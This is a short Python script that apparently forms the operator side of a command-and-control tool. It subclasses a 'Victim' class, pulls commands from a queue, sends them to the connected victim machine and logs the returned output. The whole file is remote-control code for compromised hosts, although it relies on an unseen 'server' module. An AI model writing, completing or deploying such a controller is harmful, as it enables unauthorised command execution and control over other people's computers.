#!/usr/bin/env python3
import server; 
import sys
import functools

print = functools.partial(print, flush=True)
class payload(server.Victim):
    def run(self):
        command=""
     #  print(str(self.secure_recv()))
     #   self.secure_send(bytearray(b'hello world'),11)
     #   self.secure_send(bytearray(b'hello world this is the server'),30)
        while True:
            self.print2DB(str('\33[32m'+command + '\33[0m') +"\n"+ str('\033[91m' +str(self.secure_recv().decode()) + '\033[0m'))
            command = str(self.getCommandFromQueue())
            while True:
                self.secure_send(command.encode(),len(command.encode()))
                self.secure_send(command.encode(),len(command.encode()))
                if (self.secure_recv().decode() == "True"):
                    break;
                
if __name__ == "__main__":
    server.run(payload)
